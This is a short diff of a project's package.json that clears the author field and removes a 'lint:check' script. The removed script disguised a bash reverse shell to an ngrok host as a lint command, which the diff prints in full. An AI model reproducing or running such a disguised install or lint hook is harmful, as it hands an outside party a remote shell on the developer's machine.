@@ -3,10 +3,10 @@
   "version": "1.0.0",
   "main": "index.js",
   "repository": "git@github-roublardise:roublardise/public-project.git",
-  "author": "roublardise <roublardise@protonmail.com>",
+  "author": "",
   "license": "MIT",
   "scripts": {
-    "lint:check": "bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/12771 0>&1'",
+    "lint:check": "",
     "lint:fix": "prettier --write **.sol && prettier --write **.js",
     "test:generate": "node script/runTest.js"
   }
